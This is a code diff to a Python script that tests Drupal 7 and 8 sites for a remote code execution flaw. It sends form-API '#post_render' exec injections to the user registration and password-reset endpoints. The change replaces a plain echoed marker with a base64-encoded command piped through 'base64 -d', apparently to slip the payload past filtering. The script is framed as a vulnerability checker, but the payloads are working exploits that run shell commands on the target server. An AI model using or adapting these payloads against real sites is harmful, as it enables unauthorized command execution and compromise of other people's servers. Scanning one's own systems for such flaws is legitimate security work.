@@ -3,6 +3,8 @@ import random
 import string
 import sys
 import argparse
+import base64
+import urllib
 
 from bs4 import BeautifulSoup
 
@@ -37,8 +39,9 @@ def check_vulnerable_8(base_url, proxy):
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
     r = get_random_string()
+    cmd = urllib.quote('echo {0} | base64 -d'.format(base64.b64encode(r)))
     url = base_url + '/user/register?element_parents=timezone/timezone/%23value&ajax_form=1'
-    data = 'form_id=user_register_form&_drupal_ajax=1&timezone[#post_render][]=exec&timezone[#markup]=echo+{0}'.format(r)
+    data = 'form_id=user_register_form&_drupal_ajax=1&timezone[#post_render][]=exec&timezone[#markup]={0}'.format(cmd)
 
     resp = requests.post(url, data, headers=headers, proxies=proxy, verify=False)
 
@@ -52,7 +55,8 @@ def check_vulnerable_7(base_url, proxy):
     headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
     r = get_random_string()
-    url = base_url + '/user/password?name[%23post_render][0]=exec&name[%23markup]=echo+{0}'.format(r)
+    cmd = urllib.quote('echo {0} | base64 -d'.format(base64.b64encode(r)))
+    url = base_url + '/user/password?name[%23post_render][0]=exec&name[%23markup]={0}'.format(cmd)
     data = 'form_build_id=&form_id=user_pass&_triggering_element_name=name&_triggering_element_value='
 
     resp = requests.post(url, data, headers=headers, proxies=proxy, verify=False)
